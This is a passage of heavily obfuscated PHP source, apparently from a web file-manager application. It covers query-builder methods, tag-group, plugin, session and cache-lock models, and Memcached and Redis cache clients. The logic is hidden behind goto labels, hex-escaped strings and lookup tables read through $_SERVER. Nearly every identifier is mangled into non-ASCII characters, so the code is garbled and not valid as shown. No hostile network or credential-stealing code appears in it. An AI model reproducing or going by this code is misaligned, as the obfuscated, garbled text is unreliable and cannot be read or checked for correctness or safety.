(is_array($C‘àÅÒàª)) { $this->options[$C ¡‰¡ä¤[278]] = $C‘àÅÒàª; } elseif (!empty($C‘àÅÒàª)) { $this->options[$C ¡‰¡ä¤[278]][] = $C‘àÅÒàª; } return $this; } public function union($C«£Ïô­¬¹, $d ê®ù‰ = false) { goto BÚ©…Ì®; eÊíó¬í: return $this; goto aª‹¯î¨ô„; BÚ©…Ì®: $bñô±—­Š¼ =& $_SERVER[¢ÌÛ]; if (empty($C«£Ïô­¬¹)) { return $this; } if ($d ê®ù‰) { $this->options[$bñô±—­Š¼[343]][$bñô±—­Š¼[344]] = !0; } goto B¹¶´½ƒ¡ˆ; B¹¶´½ƒ¡ˆ: if (is_object($C«£Ïô­¬¹)) { $C«£Ïô­¬¹ = get_object_vars($C«£Ïô­¬¹); } if (is_string($C«£Ïô­¬¹)) { $FæÍÊù´¨ì = $C«£Ïô­¬¹; } elseif (is_array($C«£Ïô­¬¹)) { if (isset($C«£Ïô­¬¹[0])) { $this->options[$bñô±—­Š¼[343]] = array_merge($this->options[$bñô±—­Š¼[343]], $C«£Ïô­¬¹); return $this; } else { $FæÍÊù´¨ì = $C«£Ïô­¬¹; } } else { think_exception(think_lang($bñô±—­Š¼[267])); } $this->options[$bñô±—­Š¼[343]][] = $FæÍÊù´¨ì; goto eÊíó¬í; aª‹¯î¨ô„: } public function cache($cÎáİØæŠ = true, $bÔê¦Ä«óŠ = null, $cÙ¶ ôÌÖ¦ = '') { $a¸ù»èÉ¶˜ =& $_SERVER[¢ÌÛ]; if (!1 !== $cÎáİØæŠ) { $this->options[$a¸ù»èÉ¶˜[345]] = array($a¸ù»èÉ¶˜[92] => $cÎáİØæŠ, $a¸ù»èÉ¶˜[335] => $bÔê¦Ä«óŠ, $a¸ù»èÉ¶˜[29] => $cÙ¶ ôÌÖ¦); } return $this; } public function field($D É„îè™‡, $D±–à–Æ´ = false) { $Bìï‹…ÆÅç =& $_SERVER[¢ÌÛ]; if (!0 === $D É„îè™‡) { $bÓš®İ¨ÒÍ = $this->getDbFields(); $D É„îè™‡ = $bÓš®İ¨ÒÍ ? $bÓš®İ¨ÒÍ : $Bìï‹…ÆÅç[182]; } elseif ($D±–à–Æ´) { if (is_string($D É„îè™‡)) { $D É„îè™‡ = explode($Bìï‹…ÆÅç[47], $D É„îè™‡); } $bÓš®İ¨ÒÍ = $this->getDbFields(); $D É„îè™‡ = $bÓš®İ¨ÒÍ ? array_diff($bÓš®İ¨ÒÍ, $D É„îè™‡) : $D É„îè™‡; } $this->options[$Bìï‹…ÆÅç[269]] = $D É„îè™‡; return $this; } public function scope($déÓ†Ø§ = '', $Cƒ‡‰ä¿ã = NULL) { $DÇçÉ‰µµ =& $_SERVER[¢ÌÛ]; if ($DÇçÉ‰µµ[33] === $déÓ†Ø§) { if (isset($this->_scope[$DÇçÉ‰µµ[34]])) { $c¨†”¸Í¯Ê = $this->_scope[$DÇçÉ‰µµ[34]]; } else { return $this; } } elseif (is_string($déÓ†Ø§)) { $a±ÃÒ…áĞ† = explode($DÇçÉ‰µµ[47], $déÓ†Ø§); $c¨†”¸Í¯Ê = array(); foreach ($a±ÃÒ…áĞ† as $aÊ‰‰¬®œŠ) { if (!isset($this->_scope[$aÊ‰‰¬®œŠ])) { continue; } $c¨†”¸Í¯Ê = array_merge($c¨†”¸Í¯Ê, $this->_scope[$aÊ‰‰¬®œŠ]); } if (!empty($Cƒ‡‰ä¿ã) && is_array($Cƒ‡‰ä¿ã)) { $c¨†”¸Í¯Ê = array_merge($c¨†”¸Í¯Ê, $Cƒ‡‰ä¿ã); } } elseif (is_array($déÓ†Ø§)) { $c¨†”¸Í¯Ê = $déÓ†Ø§; } if (is_array($c¨†”¸Í¯Ê) && !empty($c¨†”¸Í¯Ê)) { $this->options = array_merge($this->options, array_change_key_case($c¨†”¸Í¯Ê)); } return $this; } public function where($DÇÅ‚Š¹É, $e‡ÎÄ¯…õŠ = null) { $f­ÓìÓÜô =& $_SERVER[¢ÌÛ]; if (!is_null($e‡ÎÄ¯…õŠ) && is_string($DÇÅ‚Š¹É)) { if (!is_array($e‡ÎÄ¯…õŠ)) { $e‡ÎÄ¯…õŠ = func_get_args(); array_shift($e‡ÎÄ¯…õŠ); } $e‡ÎÄ¯…õŠ = array_map(array($this->db, $f­ÓìÓÜô[339]), $e‡ÎÄ¯…õŠ); $DÇÅ‚Š¹É = vsprintf($DÇÅ‚Š¹É, $e‡ÎÄ¯…õŠ); } elseif (is_object($DÇÅ‚Š¹É)) { $DÇÅ‚Š¹É = get_object_vars($DÇÅ‚Š¹É); } elseif (is_array($DÇÅ‚Š¹É)) { foreach ($DÇÅ‚Š¹É as $DÀ·æ„˜  => $D¾·˜ÚÆŠ’) { if ((is_numeric($DÀ·æ„˜ ) || !$DÀ·æ„˜ ) && is_string($D¾·˜ÚÆŠ’)) { if (strpos($D¾·˜ÚÆŠ’, $f­ÓìÓÜô[346]) === 0) { continue; } think_trace($f­ÓìÓÜô[347], $f­ÓìÓÜô[33], $f­ÓìÓÜô[46]); die; } } } if (is_string($DÇÅ‚Š¹É) && $f­ÓìÓÜô[33] != $DÇÅ‚Š¹É) { $f¹Ù†Ü³ = array(); $f¹Ù†Ü³[$f­ÓìÓÜô[348]] = $DÇÅ‚Š¹É; $DÇÅ‚Š¹É = $f¹Ù†Ü³; } if (isset($this->options[$f­ÓìÓÜô[271]])) { $this->options[$f­ÓìÓÜô[271]] = array_merge($this->options[$f­ÓìÓÜô[271]], $DÇÅ‚Š¹É); } else { $this->options[$f­ÓìÓÜô[271]] = $DÇÅ‚Š¹É; } return $this; } public function limit($DÂõŠ÷ãºö, $Dâ¶®‰½ê· = null) { $fâ¾òÒ´ =& $_SERVER[¢ÌÛ]; $this->options[$fâ¾òÒ´[288]] = is_null($Dâ¶®‰½ê·) ? $DÂõŠ÷ãºö : $DÂõŠ÷ãºö . $fâ¾òÒ´[47] . $Dâ¶®‰½ê·; return $this; } public function page($E›ãá°¶©Ê, $FŞÕç¿à‡Ó = null) { $f†¼é§£‹… =& $_SERVER[¢ÌÛ]; $this->options[$f†¼é§£‹…[349]] = is_null($FŞÕç¿à‡Ó) ? $E›ãá°¶©Ê : $E›ãá°¶©Ê . $f†¼é§£‹…[47] . $FŞÕç¿à‡Ó; return $this; } public function comment($Aî¹Ù»ùÙ­) { $this->options[$_SERVER[¢ÌÛ][350]] = $Aî¹Ù»ùÙ­; return $this; } public function setProperty($eÍà‚¼ä¦‘, $FÖˆÕ¾÷»‹) { if (property_exists($this, $eÍà‚¼ä¦‘)) { $this->{$eÍà‚¼ä¦‘} = $FÖˆÕ¾÷»‹; } return $this; } } goto F¦Ş†¶¡¦˜; e’˜˜¯­Š˜: class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\x65\162\137\146\141\x76"; protected function cacheFunctionAlias($F‹öâÆ£ÃÛ) { $a±çš‰±è =& $_SERVER[¢ÌÛ]; return array($a±çš‰±è[1755] => array($F‹öâÆ£ÃÛ[0], $a±çš‰±è[1756]), $a±çš‰±è[1757] => array($F‹öâÆ£ÃÛ[0], $a±çš‰±è[1758])); } protected function get($f¨Ç²­É‘†) { $BÇÔ‹–¬…Ô =& $_SERVER[¢ÌÛ]; $AÃ›éÚ±§ = Model($BÇÔ‹–¬…Ô[485])->metaGet($f¨Ç²­É‘†, $BÇÔ‹–¬…Ô[1759]); $dË†Ùà—¤Ò = json_decode($AÃ›éÚ±§, !0); return $dË†Ùà—¤Ò ? $dË†Ùà—¤Ò : array($BÇÔ‹–¬…Ô[1760] => $BÇÔ‹–¬…Ô[86], $BÇÔ‹–¬…Ô[363] => array()); } protected function set($c™Ï¥×¬», $EÆÔÛ¦Ì”œ) { $C©Œ—½ñ =& $_SERVER[¢ÌÛ]; $EÆÔÛ¦Ì”œ = $EÆÔÛ¦Ì”œ ? $EÆÔÛ¦Ì”œ : array($C©Œ—½ñ[1760] => $C©Œ—½ñ[86], $C©Œ—½ñ[363] => array()); Model($C©Œ—½ñ[485])->metaSet($c™Ï¥×¬», $C©Œ—½ñ[1759], json_encode($EÆÔÛ¦Ì”œ)); return Model($C©Œ—½ñ[485])->metaSet($c™Ï¥×¬», $C©Œ—½ñ[1759], json_encode($EÆÔÛ¦Ì”œ)); } protected function getByTagID($A˜…±¤‹à, $CËùßİÆ—) { goto b×íå¡«Æ‚; b×íå¡«Æ‚: $EíÁø„ßàµ =& $_SERVER[¢ÌÛ]; if (!$A˜…±¤‹à || !$CËùßİÆ—) { return !1; } if (!Model($EíÁø„ßàµ[485])->getInfoSimple($A˜…±¤‹à)) { return !1; } goto dÌ‘÷²Ñ³§; A­ÂÃšääæ: return is_array($DîÚˆÉ„ä) ? $DîÚˆÉ„ä : !1; goto c¬²™­‘çµ; dÌ‘÷²Ñ³§: $A‚§†óçÚ = $this->get($A˜…±¤‹à); if (!$A‚§†óçÚ || !isset($A‚§†óçÚ[$EíÁø„ßàµ[363]])) { return !1; } $DîÚˆÉ„ä = array_find_by_field($A‚§†óçÚ[$EíÁø„ßàµ[363]], $EíÁø„ßàµ[385], $CËùßİÆ—); goto A­ÂÃšääæ; c¬²™­‘çµ: } public function listSource($B¶Ô”åŒåŸ, $F ÏõÍÑğ) { goto E÷äŸ„íÁİ; eŸ¸êë²î: foreach ($CŒšÖ£¶…Œ as $fŸçŒœ¤â => $DÇÁƒã—³) { $C¶“É»‘Æø = !0; if (!$F ÏõÍÑğ) { $f‰£´”ïª[] = $fŸçŒœ¤â; continue; } foreach ($F ÏõÍÑğ as $fÒÑİÁù×) { if (!in_array($fÒÑİÁù×, $DÇÁƒã—³)) { $C¶“É»‘Æø = !1; break; } } if ($C¶“É»‘Æø) { $f‰£´”ïª[] = $fŸçŒœ¤â; } } if (!$f‰£´”ïª) { return array(); } $dÉõÓÖ–ô = Model($d§ˆÔ«œˆª[1178])->listSource(array($d§ˆÔ«œˆª[410] => array($d§ˆÔ«œˆª[411], $f‰£´”ïª))); goto c¤ˆ‘Â×è; c¤ˆ‘Â×è: if (!$dÉõÓÖ–ô || count($f‰£´”ïª) == $dÉõÓÖ–ô[$d§ˆÔ«œˆª[360]][$d§ˆÔ«œˆª[361]]) { return $dÉõÓÖ–ô; } $dà…œˆ‚µ = array(); $b¾·˜Éã¡ = array_to_keyvalue($dÉõÓÖ–ô[$d§ˆÔ«œˆª[74]], $d§ˆÔ«œˆª[33], $d§ˆÔ«œˆª[396]); goto dìš’¾§Õ; Bø’¦¤ƒğ: $CŒšÖ£¶…Œ = array(); foreach ($Bö‘Èˆù as $fê¿×³Ñî¥) { $b¤öØ·ÁŸ“ = $fê¿×³Ñî¥[$d§ˆÔ«œˆª[75]]; if (!$b¤öØ·ÁŸ“) { continue; } if (!isset($CŒšÖ£¶…Œ[$b¤öØ·ÁŸ“])) { $CŒšÖ£¶…Œ[$b¤öØ·ÁŸ“] = array(); } $CŒšÖ£¶…Œ[$b¤öØ·ÁŸ“][] = $fê¿×³Ñî¥[$d§ˆÔ«œˆª[419]]; } $f‰£´”ïª = array(); goto eŸ¸êë²î; A´¤˜··®Œ: if ($dà…œˆ‚µ) { $this->removeBySource($B¶Ô”åŒåŸ, $dà…œˆ‚µ); } return $dÉõÓÖ–ô; goto d¹ÆñÍáÛ¦; dìš’¾§Õ: $EÎ¢ë¦†®÷ = array_to_keyvalue($dÉõÓÖ–ô[$d§ˆÔ«œˆª[73]], $d§ˆÔ«œˆª[33], $d§ˆÔ«œˆª[396]); $dàÑÏ„ ğà = array_merge($EÎ¢ë¦†®÷, $b¾·˜Éã¡); foreach ($f‰£´”ïª as $b¤öØ·ÁŸ“) { if (!in_array($b¤öØ·ÁŸ“, $dàÑÏ„ ğà)) { $dà…œˆ‚µ[] = $b¤öØ·ÁŸ“; } } goto A´¤˜··®Œ; E÷äŸ„íÁİ: $d§ˆÔ«œˆª =& $_SERVER[¢ÌÛ]; if ($F ÏõÍÑğ && !is_array($F ÏõÍÑğ)) { $F ÏõÍÑğ = array($F ÏõÍÑğ); } $Bö‘Èˆù = $this->listData($B¶Ô”åŒåŸ); goto Bø’¦¤ƒğ; d¹ÆñÍáÛ¦: } protected function listData($f’¾‰ã²–¦) { $e«®¹¹«óÔ =& $_SERVER[¢ÌÛ]; $E‰Ø‰Ûš„‹ = array($e«®¹¹«óÔ[1490] => 0, $e«®¹¹«óÔ[461] => array($e«®¹¹«óÔ[1761], 0), $e«®¹¹«óÔ[415] => $e«®¹¹«óÔ[1762] . $f’¾‰ã²–¦); $CÒœÚÂ½œ© = $e«®¹¹«óÔ[1763]; $c²—…«’¼ = $this->field($CÒœÚÂ½œ©)->where($E‰Ø‰Ûš„‹)->order($e«®¹¹«óÔ[1764])->select(); return $c²—…«’¼ ? $c²—…«’¼ : array(); } protected function addToTag($a®Š…İĞÀ, $fêö— ŠéÂ, $FÔÍ…ˆ‡Å) { $a™ÊšøÏÅ‡ =& $_SERVER[¢ÌÛ]; if (!$this->getByTagID($a®Š…İĞÀ, $FÔÍ…ˆ‡Å) || !$fêö— ŠéÂ) { return !1; } if (!Model($a™ÊšøÏÅ‡[774])->pathInfo($fêö— ŠéÂ)) { return !1; } $dçºòİå„Ï = array($a™ÊšøÏÅ‡[1490] => 0, $a™ÊšøÏÅ‡[461] => $FÔÍ…ˆ‡Å, $a™ÊšøÏÅ‡[414] => $fêö— ŠéÂ, $a™ÊšøÏÅ‡[415] => $a™ÊšøÏÅ‡[1765] . $a®Š…İĞÀ, $a™ÊšøÏÅ‡[413] => $a™ÊšøÏÅ‡[33], $a™ÊšøÏÅ‡[1661] => 0); if ($this->where($dçºòİå„Ï)->find()) { return !1; } return $this->add($dçºòİå„Ï); } protected function removeFromTag($BÇËßˆ®Ø, $DÎ¡À¬ç°², $E‚—›ºÜ) { $Dİ²í³–× =& $_SERVER[¢ÌÛ]; if (!$this->getByTagID($BÇËßˆ®Ø, $E‚—›ºÜ) || !$DÎ¡À¬ç°²) { return !1; } if (is_array($DÎ¡À¬ç°²)) { $DÎ¡À¬ç°² = array($Dİ²í³–×[7], $DÎ¡À¬ç°²); } $d·”Óœçó™ = array($Dİ²í³–×[1490] => 0, $Dİ²í³–×[461] => $E‚—›ºÜ, $Dİ²í³–×[415] => $Dİ²í³–×[1765] . $BÇËßˆ®Ø, $Dİ²í³–×[414] => $DÎ¡À¬ç°²); return $this->where($d·”Óœçó™)->delete(); } protected function removeByTag($f‡Ë…À®¡, $Bàî¦Îç›·) { $aÔ­º¯¹Ê =& $_SERVER[¢ÌÛ]; if (!$this->getByTagID($f‡Ë…À®¡, $Bàî¦Îç›·)) { return !1; } $aØ§»ÛˆÜš = array($aÔ­º¯¹Ê[1490] => 0, $aÔ­º¯¹Ê[461] => $Bàî¦Îç›·, $aÔ­º¯¹Ê[415] => $aÔ­º¯¹Ê[1765] . $f‡Ë…À®¡); return $this->where($aØ§»ÛˆÜš)->delete(); } protected function removeBySource($e™‘ĞºË¬, $Aïµ†Ò‘ùâ) { $D§ŸĞ½ƒ‚Ş =& $_SERVER[¢ÌÛ]; if (!$e™‘ĞºË¬ || !$Aïµ†Ò‘ùâ) { return !1; } if (is_array($Aïµ†Ò‘ùâ)) { $Aïµ†Ò‘ùâ = array($D§ŸĞ½ƒ‚Ş[7], $Aïµ†Ò‘ùâ); } $fçé¸¡œ·ö = array($D§ŸĞ½ƒ‚Ş[1490] => 0, $D§ŸĞ½ƒ‚Ş[414] => $Aïµ†Ò‘ùâ, $D§ŸĞ½ƒ‚Ş[461] => array($D§ŸĞ½ƒ‚Ş[948], 0), $D§ŸĞ½ƒ‚Ş[415] => $D§ŸĞ½ƒ‚Ş[1765] . $e™‘ĞºË¬); return $this->where($fçé¸¡œ·ö)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\x2e\160\154\x75\147\151\x6e\114\x69\x73\164"; public $field = array("\156\141\155\145", "\x73\x74\x61\x74\165\x73", "\162\x65\x67\x69\145\x73\x74", "\x63\157\x6e\x66\x69\147"); public function loadList($d†Öá¤Ä¥ = false) { $d¦—‹ÑŠ = array_to_keyvalue($this->listData(), $_SERVER[¢ÌÛ][28]); if ($d†Öá¤Ä¥) { return $d¦—‹ÑŠ[$d†Öá¤Ä¥]; } return $d¦—‹ÑŠ; } public function init() { $E§¥•ïñÖ =& $_SERVER[¢ÌÛ]; Hook::trigger($E§¥•ïñÖ[1766]); $d¾Ò…Éùë = $this->loadPluginList(); foreach ($d¾Ò…Éùë as $fÁôƒïí÷Œ => $C¢Êò³¾×) { $Cï¨ÛÀè½ = $this->appAllow($fÁôƒïí÷Œ, $C¢Êò³¾×); if (!$Cï¨ÛÀè½) { continue; } foreach ($C¢Êò³¾×[$E§¥•ïñÖ[1767]] as $B¤•Û‹ç => $fö×óÕ·ˆ¸) { Hook::bind($B¤•Û‹ç, $fö×óÕ·ˆ¸); } } Hook::trigger($E§¥•ïñÖ[1768]); Hook::trigger(ACTION); } public function appAllow($b¬¢‚ë‚Šé, $eó±šŒ„ä, $f‡è‘ºò“ò = true) { $AìÇŒ‹Ä¤ =& $_SERVER[¢ÌÛ]; $cí‚”›²ÜÑ = PLUGIN_DIR . $b¬¢‚ë‚Šé . $AìÇŒ‹Ä¤[1769]; if (!is_array($eó±šŒ„ä) || !is_array($eó±šŒ„ä[$AìÇŒ‹Ä¤[1767]]) || $eó±šŒ„ä[$AìÇŒ‹Ä¤[712]] != 1 || !is_file($cí‚”›²ÜÑ)) { return !1; } if ($GLOBALS[$AìÇŒ‹Ä¤[484]] == 1) { return !0; } if ($f‡è‘ºò“ò && !Action($AìÇŒ‹Ä¤[1770])->checkAuth($b¬¢‚ë‚Šé)) { return !1; } return !0; } public function unInstall($CËøó˜Œ°³) { $Bæ×Â™°›¯ =& $_SERVER[¢ÌÛ]; $AÔ’Ó‘¹·µ = $this->loadList($CËøó˜Œ°³); if (file_exists(PLUGIN_DIR . $CËøó˜Œ°³)) { Hook::apply($CËøó˜Œ°³ . $Bæ×Â™°›¯[1771]); } $this->remove($AÔ’Ó‘¹·µ[$Bæ×Â™°›¯[385]]); } public function changeStatus($cËë°†ª‡, $BË”…Òù…¢) { $Aë·¨×¡ï =& $_SERVER[¢ÌÛ]; $E‚ê¼š‹ğ = $this->loadList($cËë°†ª‡); if ($BË”…Òù…¢) { Hook::apply($cËë°†ª‡ . $Aë·¨×¡ï[1772]); } $this->update($E‚ê¼š‹ğ[$Aë·¨×¡ï[385]], array($Aë·¨×¡ï[1773] => $BË”…Òù…¢)); } public function appRegist($còì…ê×ğ„, $bˆ¸ÚŸ‘ùŸ) { $A«œ¾¨ï†Ç =& $_SERVER[¢ÌÛ]; $E¯àå®®ö¿ = $this->loadList($còì…ê×ğ„); if ($E¯àå®®ö¿) { $this->update($E¯àå®®ö¿[$A«œ¾¨ï†Ç[385]], array($A«œ¾¨ï†Ç[1767] => $bˆ¸ÚŸ‘ùŸ)); } else { $f‹ÓÄÚÅ²Û = array($A«œ¾¨ï†Ç[28] => $còì…ê×ğ„, $A«œ¾¨ï†Ç[1767] => $bˆ¸ÚŸ‘ùŸ, $A«œ¾¨ï†Ç[712] => 0, $A«œ¾¨ï†Ç[6] => $this->getConfigDefault($còì…ê×ğ„)); $this->insert($f‹ÓÄÚÅ²Û); } } public function getConfigDefault($fÙÆº¯†”ù) { $DÏì±´¬³ª =& $_SERVER[¢ÌÛ]; $c‘‰Í„šò« = array(); $A ¨¢¿æ´ = $this->getPackageJson($fÙÆº¯†”ù); if (!$A ¨¢¿æ´ && is_array($A ¨¢¿æ´[$DÏì±´¬³ª[1774]])) { return $c‘‰Í„šò«; } foreach ($A ¨¢¿æ´[$DÏì±´¬³ª[1774]] as $eİ‡ÆÌ°âÍ => $D±¹¥ª­§¡) { if (!isset($D±¹¥ª­§¡[$DÏì±´¬³ª[368]]) || isset($c‘‰Í„šò«[$eİ‡ÆÌ°âÍ])) { continue; } $c‘‰Í„šò«[$eİ‡ÆÌ°âÍ] = $D±¹¥ª­§¡[$DÏì±´¬³ª[368]]; } return $c‘‰Í„šò«; } public function getPackageJson($EÓ¿ ÏÉ) { return Hook::apply($EÓ¿ ÏÉ . $_SERVER[¢ÌÛ][1775]); } public function getConfig($c¨°‰óÒ£Ã, $eäÖ‚®ØªÔ = false) { $b¼ñ‡ôâ‹‘ =& $_SERVER[¢ÌÛ]; $E˜º©¬œ¬Ò = array(); $B§¦¨ÉÔ×£ = $this->loadList($c¨°‰óÒ£Ã); if ($B§¦¨ÉÔ×£ && is_array($B§¦¨ÉÔ×£[$b¼ñ‡ôâ‹‘[6]])) { $E˜º©¬œ¬Ò = $B§¦¨ÉÔ×£[$b¼ñ‡ôâ‹‘[6]]; } if (!$E˜º©¬œ¬Ò || $eäÖ‚®ØªÔ) { $E˜º©¬œ¬Ò = $this->getConfigDefault($c¨°‰óÒ£Ã); } return $E˜º©¬œ¬Ò; } public function setConfig($cèŠ¶ÏˆÒø, $DÂ¸§……Œ× = false) { goto a•£¼Ó‰Â; a•£¼Ó‰Â: $eéæƒïğ =& $_SERVER[¢ÌÛ]; $DÇ¡¸Ö…œ‡ = $this->loadList($cèŠ¶ÏˆÒø); if (!$DÇ¡¸Ö…œ‡) { return !1; } goto fİí‚ß”½Ç; fİí‚ß”½Ç: $E·ï¾“Œ¸ƒ = $DÇ¡¸Ö…œ‡[$eéæƒïğ[6]]; if ($DÂ¸§……Œ× == !1) { $E·ï¾“Œ¸ƒ = array(); $DÂ¸§……Œ× = $this->getConfigDefault($cèŠ¶ÏˆÒø); } foreach ($DÂ¸§……Œ× as $BíÇ´¦ÏÙ™ => $d“§´íß) { $E·ï¾“Œ¸ƒ[$BíÇ´¦ÏÙ™] = is_string($d“§´íß) ? trim($d“§´íß) : $d“§´íß; } goto E‰ÅÛóô¤; E‰ÅÛóô¤: $this->update($DÇ¡¸Ö…œ‡[$eéæƒïğ[385]], array($eéæƒïğ[6] => $E·ï¾“Œ¸ƒ)); goto C“ŒàŠĞºï; C“ŒàŠĞºï: } public function viewList() { goto d™Äé£˜Ô; E¡áœôŒŞæ: return $Aé™›˜ÀÚ„; goto bŞòŠÙå¥; d™Äé£˜Ô: $fïàª°´Èˆ =& $_SERVER[¢ÌÛ]; $c¶‹Ô”…ì† = $this->loadList(); $this->pluginScan($c¶‹Ô”…ì†); goto a¢¿«ìˆèÒ; a¢¿«ìˆèÒ: $c¶‹Ô”…ì† = $this->loadPluginList(); $Aé™›˜ÀÚ„ = array(); foreach ($c¶‹Ô”…ì† as $fØÉä£µ => $Féß¬Ü™Ş„) { unset($Féß¬Ü™Ş„[$fïàª°´Èˆ[1767]], $Féß¬Ü™Ş„[$fïàª°´Èˆ[6]]); $Cê„ “¼¾ = PLUGIN_DIR . $Féß¬Ü™Ş„[$fïàª°´Èˆ[28]] . $fïàª°´Èˆ[1769]; if (!is_file($Cê„ “¼¾)) { continue; } $E»‡‘œ­¥ğ = Hook::apply($Féß¬Ü™Ş„[$fïàª°´Èˆ[28]] . $fïàª°´Èˆ[1775]); if (is_array($E»‡‘œ­¥ğ)) { $Aé™›˜ÀÚ„[$fØÉä£µ] = array_merge($Féß¬Ü™Ş„, $E»‡‘œ­¥ğ); } } goto E¡áœôŒŞæ; bŞòŠÙå¥: } private function loadPluginList() { $dÎ½ùÀñÌç =& $_SERVER[¢ÌÛ]; $a¸øõÓŠÁ¢ = $this->loadList(); if (strtolower(MOD) == $dÎ½ùÀñÌç[1776]) { return $a¸øõÓŠÁ¢; } $Dâ“¼©Ö„ = Hook::trigger($dÎ½ùÀñÌç[1777], $a¸øõÓŠÁ¢); if ($a¸øõÓŠÁ¢ && !$Dâ“¼©Ö„) { die; } return $Dâ“¼©Ö„ ? $Dâ“¼©Ö„ : $a¸øõÓŠÁ¢; } private function pluginScan($D‰”¡Òíêß) { $dêé”­¶Üˆ =& $_SERVER[¢ÌÛ]; recursion_dir(PLUGIN_DIR, $EÚ®˜¡¸Ó§, $d«áµ£ÎÉ†, 0); foreach ($EÚ®˜¡¸Ó§ as $fíàÎ‚‰Õ) { $FÜÜÑ½›’ = get_path_this($fíàÎ‚‰Õ); if (isset($D‰”¡Òíêß[$FÜÜÑ½›’]) || !file_exists($fíàÎ‚‰Õ . $dêé”­¶Üˆ[1778]) || !file_exists($fíàÎ‚‰Õ . $dêé”­¶Üˆ[1769])) { continue; } Hook::apply($FÜÜÑ½›’ . $dêé”­¶Üˆ[1772]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\x74\145\x6d\137\x73\x65\163\x73\x69\x6f\x6e"; public function get($D §à«ŞÚî) { $C½ßáÍáˆ =& $_SERVER[¢ÌÛ]; $eì“ë÷–œ = $this->where(array($C½ßáÍáˆ[1779] => $D §à«ŞÚî))->find(); if (!is_array($eì“ë÷–œ)) { return !1; } return $eì“ë÷–œ[$C½ßáÍáˆ[715]]; } public function set($dä¦¢Ğº, $A›õ‡Ç†‰, $fô‘§°¼È¹ = 3600) { $e¹ÅîÂ­¿æ =& $_SERVER[¢ÌÛ]; $E±¸ —®Œ‹ = array($e¹ÅîÂ­¿æ[1779] => $dä¦¢Ğº, $e¹ÅîÂ­¿æ[1691] => $A›õ‡Ç†‰, $e¹ÅîÂ­¿æ[1780] => $fô‘§°¼È¹ + time()); if (Session::get($e¹ÅîÂ­¿æ[1781])) { $E±¸ —®Œ‹[$e¹ÅîÂ­¿æ[1498]] = Session::get($e¹ÅîÂ­¿æ[1781]); } else { $E±¸ —®Œ‹[$e¹ÅîÂ­¿æ[1498]] = 0; } if ($this->get($dä¦¢Ğº)) { return $this->where(array($e¹ÅîÂ­¿æ[1779] => $dä¦¢Ğº))->save($E±¸ —®Œ‹); } else { return $this->add($E±¸ —®Œ‹, array(), !0); } } public function remove($có‘–¨‹—) { return $this->where(array($_SERVER[¢ÌÛ][1779] => $có‘–¨‹—))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¢ÌÛ][1782] . time())->delete(); } } goto C§ƒÕ‚º÷; CÃ¬¤¸æÕ: class CacheLockDatabase { public function lock($b¯”¾˜¸ƒŸ, $Eé‚ƒö§ô÷ = 0) { $d½ò³Ü–«® = Model($_SERVER[¢ÌÛ][778]); $E¤Ù¿¹¸·é = microtime(!0) + $Eé‚ƒö§ô÷; while (microtime(!0) < $E¤Ù¿¹¸·é) { $aÍ¶„ùˆãÏ = $d½ò³Ü–«®->get($b¯”¾˜¸ƒŸ); if (!$aÍ¶„ùˆãÏ || $aÍ¶„ùˆãÏ < microtime(!0)) { $eÔÜŒ÷æ” = $d½ò³Ü–«®->set($b¯”¾˜¸ƒŸ, $E¤Ù¿¹¸·é); if ($eÔÜŒ÷æ”) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($A×ÍäùÒ¶¶) { return Model($_SERVER[¢ÌÛ][778])->get($A×ÍäùÒ¶¶); } public function unlock($b«Òìïèäš) { Model($_SERVER[¢ÌÛ][778])->remove($b«Òìïèäš); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($D˜Ã„™Ö, $a«ÇÊåæÀ») { $B®†‹Úà¥ª =& $_SERVER[¢ÌÛ]; if (!class_exists($B®†‹Úà¥ª[805])) { show_json($B®†‹Úà¥ª[806], !1); } $this->cacheTime = $a«ÇÊåæÀ»; $this->handle = new Memcached(); if (is_array($D˜Ã„™Ö[$B®†‹Úà¥ª[807]]) && count($D˜Ã„™Ö[$B®†‹Úà¥ª[807]]) >= 1) { foreach ($D˜Ã„™Ö[$B®†‹Úà¥ª[807]] as $cî‹Ë‡â) { $d¼äøÓÓõ÷ = explode($B®†‹Úà¥ª[4], $cî‹Ë‡â); $this->handle->addServer($d¼äøÓÓõ÷[0], $d¼äøÓÓõ÷[1]); } } else { $this->handle->addServer($D˜Ã„™Ö[$B®†‹Úà¥ª[175]], $D˜Ã„™Ö[$B®†‹Úà¥ª[176]]); } } public function set($BƒÚé¨æ, $c‘Üƒ¼õ›, $FŸéŒÌŒÖò = false) { $FŸéŒÌŒÖò = $FŸéŒÌŒÖò ? $FŸéŒÌŒÖò : $this->cacheTime; return $this->handle->set($BƒÚé¨æ, $c‘Üƒ¼õ›, $FŸéŒÌŒÖò); } public function get($C ãˆÆ»Âğ) { return $this->handle->get($C ãˆÆ»Âğ); } public function remove($eá¢ÓŸÅ´Ï) { return $this->handle->delete($eá¢ÓŸÅ´Ï); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($fóºø¥Ş¤ö, $DÇ…œ‚ŒÑŠ) { $bŸ…¼é¼†Ü =& $_SERVER[¢ÌÛ]; if (!class_exists($bŸ…¼é¼†Ü[808])) { show_json($bŸ…¼é¼†Ü[809], !1); } $this->cacheTime = $DÇ…œ‚ŒÑŠ; $F‘³§ùÉ§õ = isset($fóºø¥Ş¤ö[$bŸ…¼é¼†Ü[810]]) ? $fóºø¥Ş¤ö[$bŸ…¼é¼†Ü[810]] : 10; $e¡ÜæŞ’£ = _get($fóºø¥Ş¤ö, $bŸ…¼é¼†Ü[807]); if ($e¡ÜæŞ’£ && is_array($e¡ÜæŞ’£)) { $this->initCluster($fóºø¥Ş¤ö, $F‘³§ùÉ§õ); } else { $this->handle = $this->init($fóºø¥Ş¤ö, $F‘³§ùÉ§õ); } } private function init($féÙÅ«­´, $E’åˆ•ï) { $dÓ· Ñ‡°ù =& $_SERVER[¢ÌÛ]; $dğÊ¢ÑÜìñ = new Redis(); $Bê÷ÄˆÅÌ£ = isset($féÙÅ«­´[$dÓ· Ñ‡°ù[811]]) ? $féÙÅ«­´[$dÓ· Ñ‡°ù[811]] : !1; if ($Bê÷ÄˆÅÌ£) { $dğÊ¢ÑÜìñ->pconnect($féÙÅ«­´[$dÓ· 